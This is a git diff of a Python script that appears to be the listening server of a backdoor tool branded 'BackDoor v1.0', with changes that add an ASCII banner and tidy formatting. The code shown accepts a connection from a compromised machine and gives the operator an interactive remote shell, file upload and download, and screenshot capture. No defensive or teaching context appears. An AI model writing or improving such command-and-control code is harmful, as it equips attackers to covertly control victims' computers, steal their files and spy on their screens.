@@ -6,13 +6,25 @@ import base64
 # import pickle
 import tqdm
 
-HOST = '127.0.0.1' # '192.168.43.82'
-PORT = 8081 # 2222
+HOST = '127.0.0.1'  # '192.168.43.82'
+PORT = 8081  # 2222
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 server.bind((HOST, PORT))
+
+print(f"""
+
+     ______              _     _____                  
+    (____  \            | |   (____ \                   
+     ____)  ) ____  ____| |  _ _   \ \ ___   ___   ____ 
+    |  __  ( / _  |/ ___) | / ) |   | / _ \ / _ \ / ___)
+    | |__)  | ( | ( (___| |< (| |__/ / |_| | |_| | |    
+    |______/ \_||_|\____)_| \_)_____/ \___/ \___/|_|    
+                                v1.0 - by ZeaCeR#5641
+
+    """)
 
 print('+ Server Started')
 print('+ Listening for incoming connections ...')
@@ -22,6 +34,8 @@ print(f'+ {client_addr} connected to the server')
 
 # RELIABLE SEND
 # -----------------------------------
+
+
 def send(data):
     try:
         # data = data.encode()
@@ -33,6 +47,8 @@ def send(data):
 
 # RELIABLE RECIEVE
 # -----------------------------------
+
+
 def recv():
     data = b""
     while True:
@@ -57,6 +73,8 @@ def send_file(filename):
 
 # RECIEVE FILE
 # -----------------------------------
+
+
 def recv_file():
     # print("starting function")
     data = b""
@@ -73,14 +91,15 @@ def recv_file():
             print(e)
             break
 
+
 # SHELL SERVER
 # -----------------------------------
 count = 1
+
+
 def shell():
 
     global count
-
-    clear_screen_wordlist = ["clear", "cls", "clearscreen"]
 
     while True:
         command = input(f'+ Shell#~{client_addr}: ')
@@ -107,7 +126,7 @@ def shell():
             except:
                 failed = "Failed to Upload"
                 send_file(base64.b64encode(failed))
-        
+
         elif command[:10] == "screenshot":
             try:
                 with open("screenshot.png", "wb") as screen:
@@ -121,8 +140,8 @@ def shell():
             except:
                 print("[!!] Failed to get screenshot")
                 continue
-        
-        elif command in clear_screen_wordlist:
+
+        elif command == "clear":
             if platform.system().lower().startswith("win"):
                 os.system("cls")
             else:
@@ -130,7 +149,6 @@ def shell():
 
         result = recv()
         print(result)
-    
+
 
 shell()
-
